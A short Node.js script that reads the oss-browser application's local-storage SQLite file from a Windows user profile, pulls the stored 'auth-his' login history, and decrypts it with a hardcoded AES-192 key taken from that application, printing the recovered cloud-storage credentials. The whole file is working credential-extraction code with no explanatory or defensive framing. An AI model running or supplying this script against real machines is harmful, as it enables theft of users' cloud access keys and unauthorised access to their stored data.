
var crypto = require("crypto");
var ALGORITHM = "aes192";
var KEY = "x82m#*lx8vv";

var sqlite3 = require('sqlite3');

// oss-browser localstorage file
var db = new sqlite3.Database('C:\\Users\\test\\AppData\\Roaming\\oss-browser\\Local Storage\\file__0.localstorage',function() {
	// windows key name is auth-his
	db.all("select value from main.ItemTable where key = 'auth-his';",function(err,res){
	    if(!err) {
			// get cipher_buffer
			var cipher_buffer = res[0]['value'];
			var decrypted = "";
			var cipher_text = "";

			// get cipher_string
			for (var i = 0; i < cipher_buffer.length; i++) {
				if(cipher_buffer[i] != 0) {
					cipher_text += String.fromCharCode(cipher_buffer[i]);
				}
			}

			console.log(cipher_text);
			// decrypt
			var decipher = crypto.createDecipher(ALGORITHM, KEY);
			decrypted += decipher.update(cipher_text, "hex", "utf8");
			decrypted += decipher.final("utf8");
			console.log(decrypted);

		}
	    else {
	    	console.log(err);
		}
	});


});




